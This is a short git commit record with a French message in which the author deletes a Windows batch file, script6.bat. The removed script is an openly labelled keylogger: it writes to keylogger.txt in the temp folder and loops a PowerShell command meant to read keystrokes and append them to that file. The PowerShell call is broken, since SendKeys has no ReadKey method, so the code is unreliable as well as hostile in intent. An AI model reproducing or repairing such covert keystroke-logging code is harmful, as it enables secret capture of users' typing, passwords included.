671259399729590c9b739397b8f1d4885c81ccf9
Elohyrr <118767910+Elohyrr@users.noreply.github.com>
2024-02-06 18:43:51 +0100

    la ça marche, donc c la commande qui foireux

--- script6.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-setlocal EnableDelayedExpansion
-
-set "logfile=%TEMP%\keylogger.txt"
-
-:listen
-powershell.exe -Command "& {Add-Type -AssemblyName System.Windows.Forms; $key = [System.Windows.Forms.SendKeys]::ReadKey(); Out-File -FilePath '%logfile%' -Append -InputObject $key}"
-goto listen
